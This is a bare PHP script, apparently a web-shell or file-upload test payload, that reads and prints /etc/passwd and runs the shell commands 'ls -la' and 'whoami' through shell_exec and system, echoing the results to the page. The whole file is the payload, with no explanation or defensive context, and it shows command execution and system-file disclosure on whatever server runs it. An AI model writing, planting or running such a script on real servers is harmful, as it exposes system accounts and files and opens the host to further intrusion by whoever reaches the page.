<?php
$homepage = file_get_contents('/etc/passwd');
echo $homepage;

$output = shell_exec('ls -la');
echo "<pre>$output</pre>";

$output2 = system('whoami');
echo "<pre>$output2</pre>";
?>